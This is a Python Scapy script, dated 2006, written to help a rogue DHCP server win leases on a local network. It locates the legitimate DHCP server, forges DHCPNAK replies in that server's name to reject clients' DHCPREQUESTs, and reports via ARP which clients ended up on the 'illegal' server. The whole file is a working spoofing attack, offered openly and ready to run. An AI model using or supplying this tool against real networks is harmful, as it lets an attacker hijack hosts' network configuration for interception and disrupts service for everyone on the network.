#!/usr/bin/env python
#
# Author: Arn Vollebregt
# Email: firstname.lastname@xs4all.nl 
# Version: 0.5.2
# Date: 12-06-2006 
# URL: http://82.92.8.139/projects/scapy/
# Requires: Scapy ( http://www.secdev.org/projects/scapy/ )
#
# Goal:
# Denying x DHCP requests from DHCP clients, in the hope that the DHCP client will choose our 
# illegal DHCP server over the legit DHCP server. 
#
# What does it do: 
# * Sends a DHCPDISCOVER packet to discover the legit DHCP server.
# * Detects DHCPREQUEST (broadcast) packets from DHCP clients, and spoofs DHCPNAK packets from the
#   legit DHCP server. 
# * Limited to x DHCPNAK packets per DHCP client per negotiation, to avoid total disfunction of 
#   DHCP clients. x configurable via 'limit' variable (defaults to 3).
# * Reports if a DHCP client aquired a lease from the legit or illegal DHCP server.
# * Only retains client information during lease negotiations. New negotiation means new attempt. 
#
# What it does not do (yet):
# * Does not handle multiple (legit) DHCP servers yet. 
# * Does not use ARP yet to aquire the illegal DHCP's MAC address (cant figure out why that doesnt
#   want to work for now).
#
# TODO:
# * Find out how to sendp and sniff concurrently.
# * Solve my ARP discovery problem.

# Number of DHCPNAK packets to spoof before giving up.
limit = 3

import sys
import string
 
if len(sys.argv) is 1:
    print("Usage: " + sys.argv[0] + " -ip=<illegal DHCP server IP> -mac=<illegal DHCP server mac>"+
    " -v=<0|1|2>")
    print("Example: " + sys.argv[0] + " -ip=192.168.0.2 -mac=00:00:00:00:00:00 -v=1")
    print("-ip : Your own DHCP server, so that we know not to spoof DHCPNAK's from it.")
    print("-mac: The MAC address of your DHCP server. (See source for reason)")
    print("-v  : Verbosity level; 0: Silent 1: Detected DHCP leases 2: Detected DHCPREQUEST's+"+
    "spoofed DHCPNAK's")
    print("-ip and -mac are manditory, -v is optional (defaults to 2)")
    sys.exit(0)

globals()['verbose'] = 2

for i in range(len(sys.argv)):
    if string.find(sys.argv[i], "-ip") is 0:
        globals()['illegal_dhcp_server_ip'] = sys.argv[i].split('=')[1]
    elif string.find(sys.argv[i], "-mac") is 0:
        globals()['illegal_dhcp_server_mac'] = sys.argv[i].split('=')[1]
    elif string.find(sys.argv[i], "-v") is 0:
        globals()['verbose'] = int(sys.argv[i].split('=')[1])

if vars().has_key('illegal_dhcp_server_ip') is False:
    print("Please provide the -ip switch")
    sys.exit(0)
if vars().has_key('illegal_dhcp_server_mac') is False:
    print("Please provide the -mac switch")
    sys.exit(0)

from scapy import conf,sendp,srp1,sniff,Ether,IP,ARP,UDP,BOOTP,DHCP
conf.verb=0

# TODO: Find out why this works in a standalone script, but not here. Might be my slow laptop...
# Aquiring the MAC address of the illegal DHCP server.
#packet=srp1(Ether()/ARP(pdst=illegal_dhcp_server_ip))
#illegal_dhcp_server_mac = packet.hwsrc 

# This array will hold the MAC from a DHCP client, and the number of times we have tried to spoof 
# a DHCPNAK from the legit DHCP server.
attempted_dhcpnaks = {}

# This array holds the MAC address from DHCP clients which have send a DHCPREQUEST. We use it to
# cross reference it with ARP packets to see from which DHCP server a lease was obtained.
macs = {}

def msg(string, level):
    if globals()['verbose'] >= level:
        print(string)

# Sending a DHCPDISCOVER to aquire the DHCP server IP.
msg("Sending DHCPDISCOVER packet to discover DHCP servers",2)
sendp(Ether(src="00:00:00:00:00:00",dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")
/UDP(sport=68,dport=67)/BOOTP(chaddr="\x00\x00\x00\x00\x00\x00",xid=0x10000000)/
DHCP(options=[('message-type','discover'),('end')]))

# Filtering out the DHCP server it's IP address, and storing it in a global variable. We ignore our 
# own DHCP server via a bpf filter in the sniff command below. 
def get_dhcp_server(pkt):
    if pkt[DHCP] and pkt[DHCP].options[0][1] == 2:
        globals()["dhcp_server_ip"] = pkt[IP].src
        globals()["dhcp_server_mac"] = pkt[Ether].src
        msg("Legit DHCP server found on " + globals()['dhcp_server_ip'],1)

# Detecting DHCPREQUEST packets and ARP packets.
def detect_dhcp_request(pkt):
    if pkt[DHCP] and pkt[DHCP].options[0][1] == 3:
        msg("DHCPREQUEST detected from " + pkt[Ether].src,2)
        globals()['macs'][pkt[Ether].src] = pkt[Ether].src 
        if globals()['attempted_dhcpnaks'].has_key(pkt[Ether].src) == False:
            globals()['attempted_dhcpnaks'][pkt[Ether].src] = 0
        if globals()['attempted_dhcpnaks'][pkt[Ether].src] < globals()['limit']:
            globals()['attempted_dhcpnaks'][pkt[Ether].src] += 1
            nak_request(pkt)
        else:
            msg("Giving up on spoofing DHCPNAK's for " + pkt[Ether].src + ", failed " +
            str(globals()['limit']) + " times",2)
            del globals()['attempted_dhcpnaks'][pkt[Ether].src]
    if pkt[ARP] and pkt[ARP].op == 0x0002:
        if globals()['macs'].has_key(pkt[Ether].src) == True:
            if pkt[ARP].hwdst == globals()['illegal_dhcp_server_mac']:
                msg("Succes: DHCP client " + pkt[ARP].hwsrc + " obtained a lease for " +
                pkt[ARP].psrc + "from the illegal DHCP server",1) 
            elif pkt[ARP].hwdst == globals()['dhcp_server_mac']:
                msg("Failure: DHCP client " + pkt[ARP].hwsrc + " obtained a lease for " +
                pkt[ARP].psrc + " from the legit DHCP server",1) 
            del globals()['macs'][pkt[Ether].src]

# Spoofing a DHCPNAK from the legit DHCP server when a DHCPREQUEST is send from the DHCP client.
def nak_request(pkt):
    msg("Spoofing DHCPNAK from " + globals()['dhcp_server_mac'],2)
    sendp(Ether(src=globals()['dhcp_server_mac'], dst=pkt[Ether].dst)/
    IP(src=globals()['dhcp_server_ip'],dst=pkt[IP].dst)/UDP(sport=67,dport=68)/
    BOOTP(op=2, ciaddr=pkt[IP].src,siaddr=pkt[IP].dst,chaddr=pkt[Ether].src, xid=pkt[BOOTP].xid)/
    DHCP(options=[('server_id',globals()['dhcp_server_ip']),('message-type','nak'), ('end')]))

sniff(filter="udp and not host " + globals()['illegal_dhcp_server_ip'] + " and (port 67 or 68)",
prn=get_dhcp_server, store=0, count=1, timeout=1)

if globals().has_key('dhcp_server_ip') == False:
    print("No other DHCP server found, exiting")
    sys.exit(0)

sniff(filter="arp or (udp and (port 67 or 68))", prn=detect_dhcp_request, store=0)

